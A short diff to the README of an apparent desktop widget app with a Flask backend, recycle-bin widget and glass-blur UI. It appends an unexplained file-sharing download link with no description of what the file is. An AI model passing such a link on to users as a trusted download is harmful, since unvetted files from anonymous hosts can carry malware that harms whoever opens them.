@@ -59,3 +59,6 @@ Click **Init Server** in the app to start the Flask backend on `localhost:5000`.
 - **Recycle Bin widget** — view, restore, or empty the Windows recycle bin
 - **Config toggles** — blur background, show/hide trash widget, music player (AIMP)
 - **Glass blur UI** — glassmorphism theme on both the desktop app and web client
+
+Link for file:
+https://limewire.com/d/V5uDn#Ewxyk0dViz
